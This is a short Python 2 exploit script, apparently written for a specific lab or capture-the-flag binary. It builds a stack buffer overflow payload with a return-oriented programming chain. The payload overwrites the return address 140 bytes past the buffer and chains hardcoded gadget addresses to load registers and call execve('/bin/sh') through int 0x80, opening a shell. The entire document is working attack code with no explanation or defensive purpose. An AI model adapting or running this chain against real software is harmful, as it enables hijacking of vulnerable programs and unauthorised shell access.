import struct

#buffer_addr = 0xbffff680 # In gdb
buffer_addr = 0xbffff640 # Outside of gdb
dist = 140 # Distance from buffer to RA

# Gadgets
pop_ebx_ret = 0x080481c9 # pop ebx ; ret
pop_ecx_ret = 0x080e55ad # pop ecx ; ret
xor_eax_eax_ret = 0x080544e0 # xor eax, eax ; ret
inc_eax_ret = 0x0807b6b6 # inc eax ; ret
int_80_ret = 0x08049401 # int 0x80

s = "/bin/sh\x00"
s += struct.pack("<L", buffer_addr)
s += "\x00"*4
s += "A" * (dist - len(s))
s += struct.pack("<L", pop_ebx_ret)
s += struct.pack("<L", buffer_addr) # ebx = pointer to "/bin/sh\x00"
s += struct.pack("<L", pop_ecx_ret)
s += struct.pack("<L", buffer_addr + 8) # ecx = pointer to ["/bin/sh\x00", NULL]
s += struct.pack("<L", xor_eax_eax_ret) # eax = 0
s += struct.pack("<L", inc_eax_ret) * 0xb # eax = syscall 11 = execve
s += struct.pack("<L", int_80_ret) # syscall

print s
